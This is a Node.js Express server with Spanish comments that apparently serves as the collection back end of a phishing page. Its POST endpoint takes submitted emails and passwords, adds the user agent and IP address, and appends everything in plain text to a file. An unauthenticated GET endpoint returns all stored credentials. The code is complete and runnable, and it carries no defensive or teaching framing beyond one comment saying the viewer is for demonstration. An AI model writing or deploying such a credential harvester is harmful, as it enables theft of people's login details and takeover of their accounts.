const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());

// Endpoint para recibir credenciales
app.post('/api/credentials', (req, res) => {
    const { email, password, timestamp, userAgent } = req.body;
    
    const credencial = {
        email,
        password,
        timestamp: timestamp || new Date().toISOString(),
        userAgent: userAgent || 'Unknown',
        ip: req.ip || req.connection.remoteAddress
    };
    
    // Guardar en archivo
    const logFile = path.join(__dirname, 'credenciales.txt');
    const logEntry = `
========================================
Fecha: ${credencial.timestamp}
Email: ${credencial.email}
Password: ${credencial.password}
User Agent: ${credencial.userAgent}
IP: ${credencial.ip}
========================================
`;
    
    fs.appendFile(logFile, logEntry, (err) => {
        if (err) {
            console.error('Error al guardar:', err);
            return res.status(500).json({ success: false, error: 'Error al guardar' });
        }
        
        console.log('Credencial guardada:', credencial.email);
        res.json({ success: true, message: 'Credenciales guardadas' });
    });
});

// Endpoint para ver credenciales (solo para demostración)
app.get('/api/credentials', (req, res) => {
    const logFile = path.join(__dirname, 'credenciales.txt');
    
    fs.readFile(logFile, 'utf8', (err, data) => {
        if (err) {
            return res.status(404).json({ success: false, error: 'No hay credenciales guardadas' });
        }
        
        res.type('text/plain');
        res.send(data);
    });
});

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

app.listen(PORT, () => {
    console.log(`Servidor corriendo en puerto ${PORT}`);
    console.log(`Endpoint: http://localhost:${PORT}/api/credentials`);
});
